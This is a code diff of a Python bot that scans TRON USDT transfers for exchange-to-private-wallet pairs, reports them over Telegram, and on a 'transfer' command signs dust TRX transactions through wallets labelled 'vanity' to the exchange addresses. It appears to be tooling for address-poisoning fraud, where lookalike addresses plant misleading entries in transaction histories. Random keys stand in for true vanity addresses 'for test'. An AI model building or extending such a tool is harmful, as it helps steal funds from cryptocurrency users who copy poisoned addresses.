@@ -4,14 +4,14 @@ import requests
 from collections import defaultdict
 from datetime import datetime, timezone
 
-print("🚀 Starting Final Bot...")
+print("🚀 Starting Bulletproof Scanner...")
 
 # =========================
-# SETTINGS
+# 🟢 BROAD TEST SETTINGS
 # =========================
 TARGET_PAIRS = 5
 MIN_TRANSFER_USD = 50
-REQUIRED_TRANSFERS = 2
+REQUIRED_TRANSFERS = 1  # Set to 1 for instant testing. Change to 2 later.
 
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
 CHAT_ID = os.getenv("CHAT_ID", "")
@@ -29,14 +29,15 @@ def send_telegram(message):
         requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
     except: pass
 
-send_telegram("🚀 <b>Final Bot Started</b>\nScanning for pairs...")
+send_telegram("🚀 <b>Bulletproof Scanner Started</b>\nScanning for pairs...")
 
-# Main scanning loop
+# =========================
+# MAIN SCANNING LOOP
+# =========================
 while len(found_pairs) < TARGET_PAIRS:
-    print(f"\n Scanning... Found {len(found_pairs)}/{TARGET_PAIRS}")
+    print(f"\n🔄 Scanning... Found {len(found_pairs)}/{TARGET_PAIRS}")
     
     try:
-        # Get transfers - USING CORRECT FIELD NAME
         r = requests.get(
             "https://apilist.tronscanapi.com/api/token_trc20/transfers",
             params={"start": 0, "limit": 200, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "sort": "-timestamp"},
@@ -46,7 +47,7 @@ while len(found_pairs) < TARGET_PAIRS:
         data = r.json()
         transfers = data.get("token_transfers", [])  # THE FIX!
         
-        print(f"📡 Got {len(transfers)} transfers")
+        print(f" Got {len(transfers)} transfers")
         
         if not transfers:
             time.sleep(5)
@@ -65,10 +66,8 @@ while len(found_pairs) < TARGET_PAIRS:
         
         # Find patterns
         for wallet_b, txs in receivers.items():
-            if len(found_pairs) >= TARGET_PAIRS:
-                break
-            if wallet_b in checked_receivers:
-                continue
+            if len(found_pairs) >= TARGET_PAIRS: break
+            if wallet_b in checked_receivers: continue
             
             sender_counts = defaultdict(list)
             for tx in txs:
@@ -76,7 +75,6 @@ while len(found_pairs) < TARGET_PAIRS:
             
             for sender, sender_txs in sender_counts.items():
                 if len(sender_txs) >= REQUIRED_TRANSFERS:
-                    # Check if sender is CEX
                     tag_name = sender_txs[0]["tag"].get("from_address_tag", "").lower() if sender_txs[0]["tag"] else ""
                     is_cex = any(keyword in tag_name for keyword in CEX_KEYWORDS)
                     cex_name = sender_txs[0]["tag"].get("from_address_tag", "Unknown") if sender_txs[0]["tag"] else "Unknown"
@@ -84,14 +82,12 @@ while len(found_pairs) < TARGET_PAIRS:
                     if is_cex:
                         checked_receivers.add(wallet_b)
                         found_pairs.append({
-                            "wallet_a": sender,
-                            "wallet_b": wallet_b,
-                            "cex_name": cex_name,
-                            "amount": sender_txs[0]["amount"]
+                            "wallet_a": sender, "wallet_b": wallet_b,
+                            "cex_name": cex_name, "amount": sender_txs[0]["amount"]
                         })
                         
                         print(f"✅ Pair Found: {cex_name} -> {wallet_b}")
-                        send_telegram(f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS}</b>\n🏦 {cex_name}: <code>{sender[:20]}...</code>\n Private: <code>{wallet_b[:20]}...</code>\n💰 ${sender_txs[0]['amount']}")
+                        send_telegram(f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS}</b>\n🏦 {cex_name}: <code>{sender[:20]}...</code>\n👤 Private: <code>{wallet_b[:20]}...</code>\n💰 ${sender_txs[0]['amount']}")
                     break
         
         if len(found_pairs) < TARGET_PAIRS:
@@ -101,12 +97,21 @@ while len(found_pairs) < TARGET_PAIRS:
         print(f"❌ Error: {e}")
         time.sleep(10)
 
-# Found all pairs
-send_telegram(f"🎯 <b>Target Reached! Found {len(found_pairs)} pairs</b>\n\nType <b>info</b> to see all pairs or <b>transfer</b> to execute.")
+# =========================
+# INTERACTIVE WAITING ROOM (With 5-minute timeout)
+# =========================
+send_telegram(f"🎯 <b>Target Reached! Found {len(found_pairs)} pairs</b>\n\nType <b>info</b> to see pairs, or <b>transfer</b> to execute.")
 
-# Wait for commands
+start_wait = time.time()
 last_id = 0
+
 while True:
+    # 5-minute timeout so the GitHub job doesn't run for 10 hours!
+    if time.time() - start_wait > 300:
+        print("⏰ 5 minutes passed. Exiting to prevent 10-hour freeze.")
+        send_telegram("⏰ <b>Session timed out after 5 minutes.</b>\nRun the workflow again to continue.")
+        break
+
     try:
         updates = requests.get(f"{TELEGRAM_URL}/getUpdates", params={"offset": last_id, "timeout": 30}, timeout=35).json().get("result", [])
     except:
@@ -124,10 +129,41 @@ while True:
                 send_telegram(msg)
             
             elif text.lower() == "transfer":
-                send_telegram("🚀 <b>Transfer command received!</b>\n\nNote: Full transfer logic requires tronpy. For now, pairs are ready.")
-                # Add tronpy transfer logic here if needed
-            
-            elif text.lower() == "help":
-                send_telegram("<b>Commands:</b>\n• info - Show pairs\n• transfer - Execute\n• help - This message")
+                send_telegram(" <b>Transfer command received!</b>\nInitializing tronpy...")
+                
+                # Import tronpy ONLY when needed to prevent startup freeze
+                try:
+                    from tronpy import Tron
+                    from tronpy.keys import PrivateKey
+                    
+                    tron = Tron()
+                    priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
+                    main_addr = priv.public_key.to_base58check_address()
+                    
+                    send_telegram(f" Main Wallet: <code>{main_addr}</code>\nExecuting $0 TRX transfers...")
+                    
+                    for i, pair in enumerate(found_pairs):
+                        # Generate simple random wallet for test
+                        key = PrivateKey.random()
+                        vanity = key.public_key.to_base58check_address()
+                        
+                        # Main -> Vanity
+                        tx1 = tron.trx.transfer(main_addr, vanity, 1).build().sign(priv).broadcast().txid
+                        time.sleep(3)
+                        
+                        # Vanity -> CEX
+                        priv2 = PrivateKey(bytes.fromhex(key.hex()))
+                        vanity_addr = key.public_key.to_base58check_address()
+                        tx2 = tron.trx.transfer(vanity_addr, pair['wallet_a'], 1).build().sign(priv2).broadcast().txid
+                        
+                        send_telegram(f"✅ <b>#{i+1} Done</b>\nVanity: <code>{vanity[:20]}...</code>\nTX1: <code>{tx1[:20]}...</code>\nTX2: <code>{tx2[:20]}...</code>")
+                        time.sleep(5)
+                        
+                    send_telegram("✅ <b>All transfers completed!</b>")
+                except Exception as e:
+                    send_telegram(f"❌ Transfer Error: {e}")
+                break
 
     time.sleep(5)
+
+print("✅ Workflow finished successfully.")
